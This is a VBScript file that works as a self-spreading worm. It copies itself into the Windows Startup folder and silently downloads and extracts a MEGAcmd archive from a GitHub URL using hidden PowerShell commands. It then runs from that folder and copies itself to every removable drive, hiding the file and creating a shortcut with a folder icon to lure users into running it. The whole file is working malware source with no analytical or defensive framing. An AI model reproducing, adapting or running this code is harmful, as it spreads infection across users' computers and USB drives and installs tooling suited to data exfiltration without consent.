Dim objFSO, objShell, goderExecuted
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
goderExecuted = False

Dim startupFolderPath, selfScriptPath, selfScriptName
startupFolderPath = objShell.SpecialFolders("Startup")
selfScriptPath = WScript.ScriptFullName
selfScriptName = objFSO.GetFileName(selfScriptPath)

' Copy the script to startup folder if not present
If Not objFSO.FileExists(startupFolderPath & "\" & selfScriptName) Then
    objFSO.CopyFile selfScriptPath, startupFolderPath & "\" & selfScriptName
End If

Do
    Dim megaFolderPath
    megaFolderPath = "C:\Mega"
    
    ' Create C:\Mega folder if not present
    If Not objFSO.FolderExists(megaFolderPath) Then
        objFSO.CreateFolder(megaFolderPath)
    End If
    
    Dim zipFilePath, url, MegacmdPath
    MegacmdPath = megaFolderPath & "\MEGAcmd"
    zipFilePath = megaFolderPath & "\MEGAcmd.zip"
    url = "https://github.com/snxerame/Mega/raw/main/MEGAcmd.zip"
    
    ' Download and extract MEGAcmd if not present
    If Not objFSO.FolderExists(MegacmdPath) Then
        ' Download MEGAcmd.zip
        objShell.Run "powershell -command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFilePath & "')""", 0, True
        Do While Not objFSO.FileExists(zipFilePath)
            WScript.Sleep 1000
        Loop
        
        ' Extract MEGAcmd.zip
        objShell.Run "powershell -command ""Expand-Archive -Path """ & zipFilePath & """ -DestinationPath C:\Mega""", 0, False
        WScript.Sleep 1000
        
        ' Wait until extraction is complete
        Dim zipFileSize, extractedFolderSize
        zipFileSize = objFSO.GetFile(zipFilePath).Size
        Do
            extractedFolderSize = GetFolderSize(MegacmdPath)
            WScript.Sleep 1000
        Loop While extractedFolderSize < zipFileSize
    End If
    
    ' Run goder.vbs if not executed already
    If Not goderExecuted Then
        objShell.Run "cmd /c C: && cd " & megaFolderPath & "\MEGAcmd && " & selfScriptName, 0, False
        goderExecuted = True
    End If
    
    ' Copy script file to removable drives if not copied already
    Dim driveLetter, removableDrivePath, scriptOnDrivePath, shortcutPath
    For Each drive In objFSO.Drives
        If drive.DriveType = 1 Then
            driveLetter = drive.Path
            removableDrivePath = driveLetter & "\"
            scriptOnDrivePath = removableDrivePath & selfScriptName
            shortcutPath = removableDrivePath & selfScriptName & ".lnk"
            
            If Not objFSO.FileExists(scriptOnDrivePath) Then
                ' Copy the script file to the removable drive
                Dim scriptFilePath
                scriptFilePath = WScript.ScriptFullName
                objFSO.CopyFile scriptFilePath, scriptOnDrivePath
                
                ' Create a shortcut for the script file
                Dim objLink
                Set objLink = objShell.CreateShortcut(shortcutPath)
                objLink.TargetPath = scriptOnDrivePath
                objLink.IconLocation = "%SystemRoot%\system32\SHELL32.dll, 3"
                objLink.Save
                
                ' Hide the script file on the removable drive
                objShell.Run "cmd /c attrib +h """ & scriptOnDrivePath & """", 0, True
                WScript.Echo selfScriptName & " hidden on removable drive."
            End If
        End If
    Next
    
    WScript.Sleep 5000
Loop

Function GetFolderSize(folderPath)
    Dim objFolder, objFile, totalSize
    totalSize = 0
    Set objFolder = objFSO.GetFolder(folderPath)
    For Each objFile In objFolder.Files
        totalSize = totalSize + objFile.Size
    Next
    GetFolderSize = totalSize
End Function
